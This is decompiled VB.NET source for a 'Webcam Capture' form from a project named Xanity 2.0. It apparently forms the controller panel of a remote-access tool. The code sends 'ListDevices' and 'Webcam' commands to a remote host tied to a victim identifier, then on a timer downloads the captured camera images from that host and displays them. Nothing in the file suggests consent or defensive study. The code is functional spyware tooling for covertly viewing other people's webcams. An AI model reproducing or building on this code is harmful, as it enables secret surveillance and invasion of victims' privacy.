Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Xanity_2._0.My
Imports Xanity_2._0.My.Resources

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class Webcam
        Inherits Form
        ' Methods
        Public Sub New()
            Webcam.__ENCAddToList(Me)
            Me.server = New API
            Me.url = ""
            Me.z = 0
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = Webcam.__ENCList
            SyncLock list
                If (Webcam.__ENCList.Count = Webcam.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (Webcam.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = Webcam.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                Webcam.__ENCList.Item(index) = Webcam.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    Webcam.__ENCList.RemoveRange(index, (Webcam.__ENCList.Count - index))
                    Webcam.__ENCList.Capacity = Webcam.__ENCList.Count
                End If
                Webcam.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        Private Sub btn_save_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim dialog As New SaveFileDialog
                Dim dialog2 As SaveFileDialog = dialog
                dialog2.Filter = "Bitmap | *.bmp"
                dialog2.InitialDirectory = Application.StartupPath
                dialog2.Title = "Select a Path to save the Screenshot!"
                dialog2.ShowDialog
                dialog2 = Nothing
                Me.PictureBox1.Image.Save(dialog.FileName)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_start_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("Webcam", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error has occured !"
                Else
                    Me.FlatStatusBar1.Text = "Command sent!"
                    If (Me.z = 0) Then
                        Me.PictureBox1.SizeMode = PictureBoxSizeMode.CenterImage
                        Me.PictureBox1.Image = Resources.gif_load2
                    End If
                    Me.tmrlisten.Start
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error has occured !"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_stop_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.tmrlisten.Stop
        End Sub

        Public Function ByteArray2Image(ByVal ByAr As Byte()) As Image
            Dim stream As New MemoryStream(ByAr)
            Return Image.FromStream(stream)
        End Function

        Public Sub check()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWrite(AddressOf Me.Write), New Object() { Me.FlatComboBox1, client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub FlatComboBox1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.url = (host & "/" & file & "_devices.txt")
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("ListDevices", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.x = New Thread(New ThreadStart(AddressOf Me.check))
                Me.x.Start
                Me.FlatStatusBar1.Text = "Devices-list successfully received!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(Webcam))
            Me.tmrlisten = New Timer(Me.components)
            Me.FormSkin1 = New FormSkin
            Me.FlatMini1 = New FlatMini
            Me.FlatMax1 = New FlatMax
            Me.FlatCloseWE1 = New FlatCloseWE
            Me.btn_save = New FlatButton
            Me.btn_stop = New FlatButton
            Me.btn_start = New FlatButton
            Me.NumericUpDown1 = New NumericUpDown
            Me.FlatLabel2 = New FlatLabel
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.PictureBox1 = New PictureBox
            Me.FlatComboBox1 = New FlatComboBox
            Me.FlatLabel1 = New FlatLabel
            Me.FormSkin1.SuspendLayout
            Me.NumericUpDown1.BeginInit
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Me.tmrlisten.Interval = &H3E8
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.BorderColor = Color.FromArgb(&H35, &H3A, 60)
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatCloseWE1)
            Me.FormSkin1.Controls.Add(Me.btn_save)
            Me.FormSkin1.Controls.Add(Me.btn_stop)
            Me.FormSkin1.Controls.Add(Me.btn_start)
            Me.FormSkin1.Controls.Add(Me.NumericUpDown1)
            Me.FormSkin1.Controls.Add(Me.FlatLabel2)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.PictureBox1)
            Me.FormSkin1.Controls.Add(Me.FlatComboBox1)
            Me.FormSkin1.Controls.Add(Me.FlatLabel1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.DeepPink
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            Dim size2 As New Size(&H15C, &H17F)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "Webcam Capture"
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(270, 12)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = 11
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H126, 12)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = 10
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatCloseWE1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatCloseWE1.BackColor = Color.White
            Me.FlatCloseWE1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatCloseWE1.Font = New Font("Marlett", 10!)
            point2 = New Point(&H13E, 12)
            Me.FlatCloseWE1.Location = point2
            Me.FlatCloseWE1.Name = "FlatCloseWE1"
            size2 = New Size(&H12, &H12)
            Me.FlatCloseWE1.Size = size2
            Me.FlatCloseWE1.TabIndex = 9
            Me.FlatCloseWE1.Text = "FlatCloseWE1"
            Me.FlatCloseWE1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_save.BackColor = Color.Transparent
            Me.btn_save.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_save.Cursor = Cursors.Hand
            Me.btn_save.Font = New Font("Segoe UI", 10!)
            Me.btn_save.ForeColor = Color.Black
            point2 = New Point(&H119, &H14D)
            Me.btn_save.Location = point2
            Me.btn_save.Name = "btn_save"
            Me.btn_save.Rounded = False
            size2 = New Size(&H37, &H19)
            Me.btn_save.Size = size2
            Me.btn_save.TabIndex = 8
            Me.btn_save.Text = "Save"
            Me.btn_save.TextColor = Color.White
            Me.btn_stop.BackColor = Color.Transparent
            Me.btn_stop.BaseColor = Color.White
            Me.btn_stop.Cursor = Cursors.Hand
            Me.btn_stop.Font = New Font("Segoe UI", 10!)
            Me.btn_stop.ForeColor = Color.Black
            point2 = New Point(220, &H14D)
            Me.btn_stop.Location = point2
            Me.btn_stop.Name = "btn_stop"
            Me.btn_stop.Rounded = False
            size2 = New Size(&H37, &H19)
            Me.btn_stop.Size = size2
            Me.btn_stop.TabIndex = 7
            Me.btn_stop.Text = "Stop"
            Me.btn_stop.TextColor = Color.Black
            Me.btn_start.BackColor = Color.Transparent
            Me.btn_start.BaseColor = Color.DeepPink
            Me.btn_start.Cursor = Cursors.Hand
            Me.btn_start.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H9F, &H14D)
            Me.btn_start.Location = point2
            Me.btn_start.Name = "btn_start"
            Me.btn_start.Rounded = False
            size2 = New Size(&H37, &H19)
            Me.btn_start.Size = size2
            Me.btn_start.TabIndex = 6
            Me.btn_start.Text = "Start"
            Me.btn_start.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.NumericUpDown1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.NumericUpDown1.Font = New Font("Segoe UI", 10!)
            Me.NumericUpDown1.ForeColor = Color.DeepPink
            Dim num As New Decimal(New Integer() { &H3E8, 0, 0, 0 })
            Me.NumericUpDown1.Increment = num
            point2 = New Point(&H53, &H14D)
            Me.NumericUpDown1.Location = point2
            num = New Decimal(New Integer() { &H2710, 0, 0, 0 })
            Me.NumericUpDown1.Maximum = num
            num = New Decimal(New Integer() { &H3E8, 0, 0, 0 })
            Me.NumericUpDown1.Minimum = num
            Me.NumericUpDown1.Name = "NumericUpDown1"
            Me.NumericUpDown1.ReadOnly = True
            size2 = New Size(&H3E, &H19)
            Me.NumericUpDown1.Size = size2
            Me.NumericUpDown1.TabIndex = 5
            num = New Decimal(New Integer() { &H3E8, 0, 0, 0 })
            Me.NumericUpDown1.Value = num
            Me.FlatLabel2.AutoSize = True
            Me.FlatLabel2.BackColor = Color.Transparent
            Me.FlatLabel2.Font = New Font("Segoe UI", 10!)
            Me.FlatLabel2.ForeColor = Color.White
            point2 = New Point(12, &H14F)
            Me.FlatLabel2.Location = point2
            Me.FlatLabel2.Name = "FlatLabel2"
            size2 = New Size(&H41, &H13)
            Me.FlatLabel2.Size = size2
            Me.FlatLabel2.TabIndex = 4
            Me.FlatLabel2.Text = "Intervall: "
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H16B)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.White
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H15C, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 3
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.PictureBox1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            point2 = New Point(&H10, &H57)
            Me.PictureBox1.Location = point2
            Me.PictureBox1.Name = "PictureBox1"
            size2 = New Size(320, 240)
            Me.PictureBox1.Size = size2
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 2
            Me.PictureBox1.TabStop = False
            Me.FlatComboBox1.BackColor = Color.White
            Me.FlatComboBox1.Cursor = Cursors.Hand
            Me.FlatComboBox1.DrawMode = DrawMode.OwnerDrawFixed
            Me.FlatComboBox1.DropDownStyle = ComboBoxStyle.DropDownList
            Me.FlatComboBox1.Font = New Font("Segoe UI", 10!)
            Me.FlatComboBox1.ForeColor = Color.White
            Me.FlatComboBox1.FormattingEnabled = True
            Me.FlatComboBox1.HoverColor = Color.DeepPink
            Me.FlatComboBox1.ItemHeight = &H12
            point2 = New Point(&H58, &H39)
            Me.FlatComboBox1.Location = point2
            Me.FlatComboBox1.Name = "FlatComboBox1"
            size2 = New Size(&HF8, &H18)
            Me.FlatComboBox1.Size = size2
            Me.FlatComboBox1.TabIndex = 1
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 10!)
            Me.FlatLabel1.ForeColor = Color.White
            point2 = New Point(12, &H3D)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&H3E, &H13)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 0
            Me.FlatLabel1.Text = "Devices: "
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H15C, &H17F)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "Webcam"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "webcam"
            Me.TransparencyKey = Color.Fuchsia
            Me.FormSkin1.ResumeLayout(False)
            Me.FormSkin1.PerformLayout
            Me.NumericUpDown1.EndInit
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
        End Sub

        Private Sub NumericUpDown1_ValueChanged(ByVal sender As Object, ByVal e As EventArgs)
            Me.tmrlisten.Interval = Convert.ToInt32(Me.NumericUpDown1.Value)
        End Sub

        Private Sub tmrlisten_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Me.tmrlisten.Stop
            Dim str2 As String = Me.connected.Split(New Char() { "|"c })(0)
            Dim str As String = Me.connected.Split(New Char() { "|"c })(1)
            Try 
                Me.imagebytes = New WebClient().DownloadData((str2 & "/files/" & str & ".png"))
                Me.PictureBox1.Image = Me.ByteArray2Image(Me.imagebytes)
                Me.FlatStatusBar1.Text = "Picture retrieved!"
                Me.z = 1
                Me.btn_start_Click(Nothing, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub Write(ByVal cb As ComboBox, ByVal [text] As String)
            Dim num2 As Integer = (MyProject.Forms.Form1.CountCharacter([text], "|"c) - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                cb.Items.Add([text].Split(New Char() { "|"c })(i))
                i += 1
            Loop
        End Sub


        ' Properties
        Friend Overridable Property btn_save As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_save
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_save_Click)
                If (Not Me._btn_save Is Nothing) Then
                    RemoveHandler Me._btn_save.Click, handler
                End If
                Me._btn_save = value
                If (Not Me._btn_save Is Nothing) Then
                    AddHandler Me._btn_save.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_start As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_start
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_start_Click)
                If (Not Me._btn_start Is Nothing) Then
                    RemoveHandler Me._btn_start.Click, handler
                End If
                Me._btn_start = value
                If (Not Me._btn_start Is Nothing) Then
                    AddHandler Me._btn_start.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_stop As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_stop
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_stop_Click)
                If (Not Me._btn_stop Is Nothing) Then
                    RemoveHandler Me._btn_stop.Click, handler
                End If
                Me._btn_stop = value
                If (Not Me._btn_stop Is Nothing) Then
                    AddHandler Me._btn_stop.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatCloseWE1 As FlatCloseWE
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatCloseWE1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCloseWE)
                Me._FlatCloseWE1 = value
            End Set
        End Property

        Friend Overridable Property FlatComboBox1 As FlatComboBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatComboBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatComboBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FlatComboBox1_Click)
                If (Not Me._FlatComboBox1 Is Nothing) Then
                    RemoveHandler Me._FlatComboBox1.Click, handler
                End If
                Me._FlatComboBox1 = value
                If (Not Me._FlatComboBox1 Is Nothing) Then
                    AddHandler Me._FlatComboBox1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel2 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel2 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property NumericUpDown1 As NumericUpDown
            <DebuggerNonUserCode> _
            Get
                Return Me._NumericUpDown1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As NumericUpDown)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.NumericUpDown1_ValueChanged)
                If (Not Me._NumericUpDown1 Is Nothing) Then
                    RemoveHandler Me._NumericUpDown1.ValueChanged, handler
                End If
                Me._NumericUpDown1 = value
                If (Not Me._NumericUpDown1 Is Nothing) Then
                    AddHandler Me._NumericUpDown1.ValueChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property tmrlisten As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._tmrlisten
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.tmrlisten_Tick)
                If (Not Me._tmrlisten Is Nothing) Then
                    RemoveHandler Me._tmrlisten.Tick, handler
                End If
                Me._tmrlisten = value
                If (Not Me._tmrlisten Is Nothing) Then
                    AddHandler Me._tmrlisten.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("btn_save")> _
        Private _btn_save As FlatButton
        <AccessedThroughProperty("btn_start")> _
        Private _btn_start As FlatButton
        <AccessedThroughProperty("btn_stop")> _
        Private _btn_stop As FlatButton
        <AccessedThroughProperty("FlatCloseWE1")> _
        Private _FlatCloseWE1 As FlatCloseWE
        <AccessedThroughProperty("FlatComboBox1")> _
        Private _FlatComboBox1 As FlatComboBox
        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatLabel2")> _
        Private _FlatLabel2 As FlatLabel
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("NumericUpDown1")> _
        Private _NumericUpDown1 As NumericUpDown
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("tmrlisten")> _
        Private _tmrlisten As Timer
        Private components As IContainer
        Public connected As String
        Private imagebytes As Byte()
        Private server As API
        Private url As String
        Private x As Thread
        Private z As Integer

        ' Nested Types
        Public Delegate Sub DelegateWrite(ByVal cb As ComboBox, ByVal [text] As String)
    End Class
End Namespace

